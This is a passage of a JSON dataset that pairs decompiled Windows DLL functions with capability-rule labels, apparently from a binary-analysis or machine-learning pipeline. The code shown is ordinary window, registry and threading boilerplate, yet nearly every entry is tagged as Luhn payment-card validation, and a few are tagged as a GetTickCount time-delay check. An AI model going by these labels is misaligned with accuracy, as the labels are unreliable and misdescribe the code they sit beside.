        "decompiled_code": "\nvoid fcn.18002685c(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    \n    piVar1 = *(arg1 + 8);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "180026b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180026b64(ulong arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    \n    if (arg2 != 0) {\n        do {\n            iVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(arg2);\n            if (iVar1 == arg1) {\n                return arg2;\n            }\n            arg2 = (*_sym.imp.USER32.dll_GetWindow)(arg2, 2);\n        } while (arg2 != 0);\n    }\n    return arg2;\n}\n",
        "token_count": 118
    },
    "180026d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180026d04(ulong arg1, ulong arg2)\n\n{\n    fcn.18002d7a4(arg1, arg2);\n    return;\n}\n",
        "token_count": 39
    },
    "180026d2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180026d24(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18002d7e8(arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 46
    },
    "18002708": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180027084(ulong arg1, ulong arg2, uint *noname_2, ulong arg4)\n\n{\n    uchar auStack184 [32];\n    ulong uStack152;\n    uint auStack72 [2];\n    ulong uStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint64_t uStack40;\n    \n    uStack40 = *0x180067ce0 ^ auStack184;\n    uStack56 = *noname_2;\n    uStack52 = noname_2[1];\n    uStack48 = noname_2[2];\n    uStack44 = noname_2[3];\n    uStack64 = 0;\n    auStack72[0] = 2;\n    uStack152 = arg4;\n    fcn.180026e58(arg1, arg2, noname_2, auStack72);\n    fcn.180032ea0(uStack40 ^ auStack184);\n    return;\n}\n",
        "token_count": 224
    },
    "18002774": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180027740(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    ulong *puVar3;\n    \n    puVar3 = *(arg1 + 0x88);\n    while( true ) {\n        if (puVar3 == NULL) {\n            return;\n        }\n        if (puVar3 == NULL) break;\n        piVar1 = puVar3 + 2;\n        puVar3 = *puVar3;\n        if (*(*piVar1 + 8) != 0) {\n            fcn.18001e5c4(*(*piVar1 + 8), arg2);\n        }\n    }\n    fcn.180012514();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 181
    },
    "18002848": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180028484(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    int64_t iStackX32;\n    int64_t *piVar2;\n    uint64_t uVar3;\n    ulong auStack24 [2];\n    \n    auStack24[0] = 0;\n    iStackX24 = 0;\n    iStackX32 = 0;\n    piVar2 = &iStackX24;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0xffffffff80000001, L\"software\", 0, 0x2001f, piVar2);\n    if (iVar1 == 0) {\n        uVar3 = piVar2 & 0xffffffff00000000;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)\n                          (iStackX24, *(arg1 + 0xa8), 0, 0, uVar3, 0x2001f, 0, &iStackX32, auStackX16);\n        if (iVar1 == 0) {\n            (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)\n                      (iStackX32, *(arg1 + 0xd0), 0, 0, uVar3 & 0xffffffff00000000, 0x2001f, 0, auStack24, auStackX16);\n        }\n    }\n    if (iStackX24 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n    }\n    if (iStackX32 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n    }\n    return auStack24[0];\n}\n",
        "token_count": 397
    },
    "18002858": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180028588(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [8];\n    int64_t iStackX32;\n    \n    iStackX32 = 0;\n    iVar1 = fcn.180028484(arg1);\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(iVar1, arg2, 0, 0, 0, 0x2001f, 0, &iStackX32, auStackX24);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n        iVar1 = iStackX32;\n    }\n    return iVar1;\n}\n",
        "token_count": 164
    },
    "1800285f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800285fc(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    uchar auStack136 [32];\n    uint *puStack104;\n    uint uStack96;\n    uint auStack88 [2];\n    uchar auStack80 [32];\n    uint64_t uStack48;\n    \n    uStack48 = *0x180067ce0 ^ auStack136;\n    auStack88[0] = arg4;\n    if (*(arg1 + 0xa8) == 0) {\n        fcn.180035a98(auStack80, 0x10, 0x18004dc08, arg4);\n        (*_sym.imp.KERNEL32.dll_WritePrivateProfileStringW)(arg2, arg3, auStack80, *(arg1 + 0xd0));\n    }\n    else {\n        iVar1 = fcn.180028588(arg1, arg2);\n        if (iVar1 != 0) {\n            puStack104 = auStack88;\n            uStack96 = 4;\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(iVar1, arg3, 0);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n        }\n    }\n    fcn.180032ea0(uStack48 ^ auStack136);\n    return;\n}\n",
        "token_count": 301
    },
    "1800286b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800286bc(ulong uBytes)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, uBytes);\n    if (iVar2 == 0) {\n        fcn.1800124cc();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "1800286f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get thread local storage value"
        ],
        "decompiled_code": "\nulong fcn.1800286f8(uint *lpCriticalSection, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 10);\n    if ((((0 < arg2) && (arg2 < lpCriticalSection[3])) &&\n        (iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*lpCriticalSection),  iVar2 != 0)) && (arg2 < *(iVar2 + 0x10))) {\n        uVar1 = *(*(iVar2 + 0x18) + arg2 * 8);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 10);\n        return uVar1;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 10);\n    return 0;\n}\n",
        "token_count": 187
    },
    "18002876": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180028768(uint32_t *arg1)\n\n{\n    ulong uVar1;\n    \n    if ((*arg1 == 0) || (*0x18006d2e0 == 0)) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.1800286f8(*0x18006d2e0, *arg1);\n    }\n    return uVar1;\n}\n",
        "token_count": 96
    },
    "18002881": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180028818(int64_t *arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    \n    if (arg2 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    *(arg2 + arg1[1]) = *arg1;\n    *arg1 = arg2;\n    return;\n}\n",
        "token_count": 96
    },
    "18002884": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180028840(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    iVar4 = *arg1;\n    uVar3 = 0;\n    if (iVar4 == 0) {\n        uVar3 = 0;\n    }\n    else if (iVar4 == arg2) {\n        if (arg2 == 0) {\n            fcn.180012514();\n            pcVar2 = swi(3);\n            uVar3 = (*pcVar2)();\n            return uVar3;\n        }\n        *arg1 = *(arg2 + arg1[1]);\ncode_r0x0001800288a8:\n        uVar3 = 1;\n    }\n    else {\n        if (iVar4 == 0) {\n            fcn.180012514();\n            pcVar2 = swi(3);\n            uVar3 = (*pcVar2)();\n            return uVar3;\n        }\n        do {\n            iVar1 = arg1[1];\n            if (*(iVar1 + iVar4) == arg2) {\n                if (arg2 == 0) {\n                    fcn.180012514();\n                    pcVar2 = swi(3);\n                    uVar3 = (*pcVar2)();\n                    return uVar3;\n                }\n                *(iVar1 + iVar4) = *(iVar1 + arg2);\n                goto code_r0x0001800288a8;\n            }\n            iVar4 = *(iVar1 + iVar4);\n        } while (iVar4 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 360
    },
    "180028aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.180028aa0(int64_t lpCriticalSection, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    ulong *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar4 = arg2;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x28);\n    if ((0 < arg2) && (arg2 < *(lpCriticalSection + 0xc))) {\n        for (iVar3 = *(lpCriticalSection + 0x18); iVar3 != 0; iVar3 = *(iVar3 + 8)) {\n            if (arg2 < *(iVar3 + 0x10)) {\n                puVar2 = *(*(iVar3 + 0x18) + iVar4 * 8);\n                if (puVar2 != NULL) {\n                    (***puVar2)(puVar2, 1);\n                }\n                *(*(iVar3 + 0x18) + iVar4 * 8) = 0;\n            }\n        }\n        puVar1 = *(lpCriticalSection + 0x10) + iVar4 * 0x10;\n        *puVar1 = *puVar1 & 0xfffffffe;\n    }\n    // WARNING: Could not recover jumptable at 0x000180028b32. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x28);\n    return;\n}\n",
        "token_count": 323
    },
    "180028dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.180028dd4(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.180014058();\n    return *(iVar1 + 0x50) == 0;\n}\n",
        "token_count": 47
    },
    "180028de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180028dec(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.180014058();\n    LOCK();\n    *(iVar1 + 0x50) = *(iVar1 + 0x50) + 1;\n    return;\n}\n",
        "token_count": 61
    },
    "180028e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.180028e00(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.180014058();\n    return *(iVar1 + 0x54);\n}\n",
        "token_count": 43
    },
    "180028e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180028e78(void)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.180014058();\n    LOCK();\n    piVar1 = iVar2 + 0x50;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        fcn.180028e14();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "180028e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180028e94(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    for (iVar2 = (*_sym.imp.USER32.dll_GetCapture)(); iVar2 != 0; iVar2 = fcn.1800195fc(iVar2)) {\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageW)(iVar2, 0x365, 0, 0);\n        if (iVar3 != 0) {\n            return;\n        }\n    }\n    for (iVar2 = (*_sym.imp.USER32.dll_GetFocus)(); iVar2 != 0; iVar2 = fcn.1800195fc(iVar2)) {\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageW)(iVar2, 0x365, 0, 0);\n        if (iVar3 != 0) {\n            return;\n        }\n    }\n    iVar2 = fcn.180019674(arg1);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.USER32.dll_GetLastActivePopup)(*(iVar2 + 0x40));\n        while( true ) {\n            if (iVar2 == 0) {\n                (*_sym.imp.USER32.dll_SendMessageW)(*(arg1 + 0x40), 0x111, 0xe147, 0);\n                return;\n            }\n            iVar3 = (*_sym.imp.USER32.dll_SendMessageW)(iVar2, 0x365, 0, 0);\n            if (iVar3 != 0) break;\n            iVar2 = fcn.1800195fc(iVar2);\n        }\n        return;\n    }\n    fcn.180012514();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 399
    },
    "180028f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180028f74(int64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    if (*(arg1 + 0xc0) == 0) {\n        fcn.180028e94(arg1);\n    }\n    else if (*(arg1 + 0xc0) != 0x3f107) {\n        iVar1 = fcn.180014058();\n        (**(**(iVar1 + 8) + 0x158))(*(iVar1 + 8), *(arg1 + 0xc0), 1);\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "18002927": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180029278(ulong arg1, uchar *arg2, ulong arg3, ulong arg4)\n\n{\n    int16_t iVar1;\n    uchar *puVar2;\n    uchar auStack616 [32];\n    uchar auStack584 [528];\n    uint64_t uStack56;\n    \n    uStack56 = *0x180067ce0 ^ auStack616;\n    puVar2 = arg2;\n    if (arg2 == NULL) {\n        puVar2 = auStack584;\n        arg3._0_4_ = 0x104;\n    }\n    iVar1 = (*_sym.imp.COMDLG32.dll_GetFileTitleW)(arg1, puVar2);\n    if (iVar1 == 0) {\n        if (arg2 == NULL) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)(puVar2);\n        }\n    }\n    else {\n        fcn.18002f3a0(arg1, arg2, arg3, arg4);\n    }\n    fcn.180032ea0(uStack56 ^ auStack616);\n    return;\n}\n",
        "token_count": 237
    },
    "18002930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180029308(int64_t arg1, ulong arg2)\n\n{\n    ulong arg2_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong in_R8;\n    bool bVar3;\n    \n    bVar3 = false;\n    if (*(arg1 + 8) != -1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        bVar3 = iVar1 == 0;\n    }\n    *(arg1 + 8) = 0xffffffffffffffff;\n    *(arg1 + 0x10) = 0;\n    fcn.1800089e0(arg1 + 0x18, arg2, in_R8);\n    if (bVar3) {\n        arg2_00 = *(arg1 + 0x18);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.18002f8b4(uVar2, arg2_00);\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "18002939": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.180029390(code **arg1)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    code **ppcVar3;\n    int64_t iVar4;\n    \n    *arg1 = vtable.CFile.0;\n    piVar2 = fcn.180012330();\n    if (piVar2 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        ppcVar3 = (*pcVar1)();\n        return ppcVar3;\n    }\n    iVar4 = (**(*piVar2 + 0x18))(piVar2);\n    arg1[3] = iVar4 + 0x18;\n    arg1[1] = 0xffffffffffffffff;\n    *(arg1 + 2) = 0;\n    return arg1;\n}\n",
        "token_count": 189
    },
    "1800294a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800294a0(ulong arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if ((1U - *(*arg2 + -8) | *(*arg2 + -0xc) - 0x104U) < 0) {\n        fcn.180008ed0(arg2, 0x104);\n    }\n    iVar1 = *arg2;\n    fcn.180033c90(iVar1, 0, 0x104);\n    iVar3 = fcn.180036208(iVar1, 0x104, arg1, 0xffffffffffffffff);\n    iVar4 = 0;\n    if (iVar3 != 0) {\n        if (iVar3 == 0xc) {\n            fcn.1800124cc();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n            fcn.180012514();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        if (iVar3 != 0x50) {\n            fcn.180012514();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n    }\n    (*_sym.imp.SHLWAPI.dll_PathStripToRootW)(iVar1);\n    iVar1 = *arg2;\n    if (((iVar1 == 0) || (iVar4 = fcn.180035dc8(iVar1, *(iVar1 + -0xc)),  -1 < iVar4)) && (iVar4 <= *(*arg2 + -0xc))) {\n        *(*arg2 + -0x10) = iVar4;\n        *(*arg2 + iVar4 * 2) = 0;\n        return;\n    }\n    fcn.180001214(0x80070057);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 460
    },
    "18002969": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180029694(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    if (arg1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *(arg1 + 0x14) = uVar1;\n        uVar2 = fcn.18002f41c(uVar1);\n        *(arg1 + 0x10) = uVar2;\n        if (arg2 != 0) {\n            uVar3 = fcn.180033b84(arg2);\n        }\n        fcn.180008dfc(arg1 + 0x18, arg2, uVar3);\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "180029d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180029d0c(int64_t *arg1, ulong arg2, int32_t *arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    uint64_t uVar4;\n    \n    if (arg3 == NULL) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        iVar2 = (*pcVar1)();\n        return iVar2;\n    }\n    puVar3 = (**(*arg1 + 0x78))();\n    do {\n        if (puVar3 == NULL) {\n            return 0;\n        }\n        iVar2 = puVar3[1];\n        uVar4 = *(iVar2 + 0x30);\n        if (uVar4 != 0xffffffffffffffff) {\n            do {\n                if ((*(iVar2 + 8) == arg3[1]) && (uVar4 == (*arg3 != 0))) {\n                    if (*(iVar2 + 0x44) == -1) {\n                        if (*(iVar2 + 0x40) == -1) {\n                            return iVar2;\n                        }\n                        if (*(iVar2 + 0x40) == arg2) {\n                            return iVar2;\n                        }\n                    }\n                    else if ((*(iVar2 + 0x40) < arg2 || *(iVar2 + 0x40) == arg2) &&\n                            (arg2 < *(iVar2 + 0x44) || arg2 == *(iVar2 + 0x44))) {\n                        return iVar2;\n                    }\n                }\n                uVar4 = *(iVar2 + 0x78);\n                iVar2 = iVar2 + 0x48;\n            } while (uVar4 != 0xffffffffffffffff);\n        }\n        puVar3 = *puVar3;\n    } while( true );\n}\n",
        "token_count": 404
    },
    "18002a0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002a0c8(ulong *arg1, int64_t arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    ulong *puVar2;\n    \n    if ((arg2 != 0) && (arg3 != 0)) {\n        puVar2 = fcn.180009660(arg2 * arg3 + 8);\n        *puVar2 = *arg1;\n        *arg1 = puVar2;\n        return;\n    }\n    fcn.180012514();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 135
    },
    "18002a12": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18002a120(int64_t hWnd, int64_t lParam)\n\n{\n    ulong uVar1;\n    \n    uVar1 = 0;\n    if (hWnd == 0) {\n        uVar1 = 0;\n    }\n    else {\n        if (lParam != 0) {\n            uVar1 = *(lParam + 0x10);\n        }\n        uVar1 = (*_sym.imp.USER32.dll_SendMessageW)(*(hWnd + 0x40), 0x87, uVar1, lParam);\n    }\n    return uVar1;\n}\n",
        "token_count": 129
    },
    "18002a15": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18002a150(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    \n    if (arg1 != NULL) {\n        piVar1 = arg1[1];\n        if (piVar1 == NULL) {\n            iVar4 = *arg1;\n        }\n        else {\n            iVar4 = piVar1[9];\n        }\n        if (iVar4 == 0) {\n            if ((piVar1 == NULL) || (uVar3 = (**(*piVar1 + 0xf0))(piVar1),  (uVar3 >> 0x1b & 1) == 0))\n            goto code_r0x00018002a1a2;\n        }\n        else {\n            iVar2 = (*_sym.imp.USER32.dll_IsWindowEnabled)();\n            if (iVar2 != 0) {\ncode_r0x00018002a1a2:\n                if (arg1[1] == 0) {\n                    return 0;\n                }\n                if ((*(arg1[1] + 0xb0) >> 0xd & 1) == 0) {\n                    return 0;\n                }\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 290
    },
    "18002a1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.18002a1c8(int64_t hWnd)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    \n    if (hWnd == 0) {\n        uVar2 = 0;\n    }\n    else if (*(hWnd + 0xa0) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_SendMessageW)(*(hWnd + 0x40), 0x87, 0, 0);\n        uVar2 = uVar1 & 0x30;\n    }\n    else {\n        uVar2 = fcn.18001e04c(*(hWnd + 0xa0));\n    }\n    return uVar2;\n}\n",
        "token_count": 159
    },
    "18002a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002a208(int64_t hWnd, ulong noname_1, ulong noname_2, ulong lParam)\n\n{\n    ulong arg1;\n    uint64_t uVar1;\n    \n    uVar1 = 0;\n    if (hWnd != 0) {\n        uVar1 = (*_sym.imp.USER32.dll_SendMessageW)(*(hWnd + 0x40), 0x87, 0, 0);\n    }\n    if ((uVar1 & 8) != 0) {\n        (*_sym.imp.USER32.dll_SendMessageW)(*(hWnd + 0x40), 0xb1, 0, 0xffffffffffffffff);\n    }\n    if (*(hWnd + 0xa0) == 0) {\n        arg1 = (*_sym.imp.USER32.dll_SetFocus)(*(hWnd + 0x40));\n        fcn.180017c38(arg1);\n    }\n    else {\n        (**(**(hWnd + 0xa0) + 0x160))();\n    }\n    return;\n}\n",
        "token_count": 231
    },
    "18002a25": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18002a254(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    ulong arg1_00;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    iVar2 = 0;\n    iVar3 = iVar2;\n    if (arg2 != 0) {\n        do {\n            iVar2 = arg2;\n            uVar1 = (*_sym.imp.USER32.dll_GetWindowLongW)(*(iVar2 + 0x40), 0xfffffff0);\n            if ((uVar1 & 0xc0000000) != 0x40000000) {\n                return iVar3;\n            }\n            if (iVar2 == arg1) {\n                return iVar3;\n            }\n            arg1_00 = (*_sym.imp.USER32.dll_GetParent)(*(iVar2 + 0x40));\n            arg2 = fcn.180017c38(arg1_00);\n            uVar1 = (*_sym.imp.USER32.dll_GetWindowLongW)(*(arg2 + 0x40), 0xffffffec);\n            iVar3 = iVar2;\n        } while ((uVar1 >> 0x10 & 1) == 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 274
    },
    "18002a3d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002a3d8(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    \n    if (arg1 != 0) {\n        piVar5 = NULL;\n        iVar4 = arg1;\n        do {\n            iVar1 = *(iVar4 + 0x98);\n            if ((iVar1 != 0) || (piVar5 = *(iVar4 + 0xa0),  piVar5 != NULL)) break;\n            uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(iVar4 + 0x40));\n            iVar4 = fcn.180017c38(uVar3);\n        } while (iVar4 != 0);\n        if ((iVar4 != 0) && (iVar1 == 0)) {\n            (**(*piVar5 + 0x160))(piVar5);\n            uVar3 = (*_sym.imp.USER32.dll_GetFocus)();\n            iVar4 = fcn.180017c38(uVar3);\n            if ((iVar4 != arg1) && (iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(arg1 + 0x40)),  iVar2 != 0)) {\n                fcn.18001bf08(arg1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 303
    },
    "18002a47": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002a478(int64_t hWnd, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    ulong arg1;\n    int64_t iVar4;\n    \n    if (((hWnd != 0) && (iVar3 = (*_sym.imp.USER32.dll_IsWindow)(*(hWnd + 0x40)),  iVar3 != 0)) && (hWnd != arg2)) {\n        do {\n            piVar1 = *(hWnd + 0x98);\n            if (piVar1 != NULL) {\n                iVar2 = piVar1[0x19];\n                iVar4 = 0;\n                if (((iVar2 != 0) && (*(iVar2 + 0xb4) == 0)) && (iVar4 = fcn.180017c38(*(iVar2 + 0x48)),  iVar4 == 0)) {\n                    return;\n                }\n                if ((arg2 != 0) && (iVar4 != 0)) {\n                    if (arg2 == iVar4) {\n                        return;\n                    }\n                    iVar3 = (*_sym.imp.USER32.dll_IsChild)(*(iVar4 + 0x40), *(arg2 + 0x40));\n                    if (iVar3 != 0) {\n                        return;\n                    }\n                }\n                (**(*piVar1 + 0xc0))(piVar1, 0);\n                return;\n            }\n            arg1 = (*_sym.imp.USER32.dll_GetParent)(*(hWnd + 0x40));\n            hWnd = fcn.180017c38(arg1);\n        } while (hWnd != 0);\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "18002a53": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
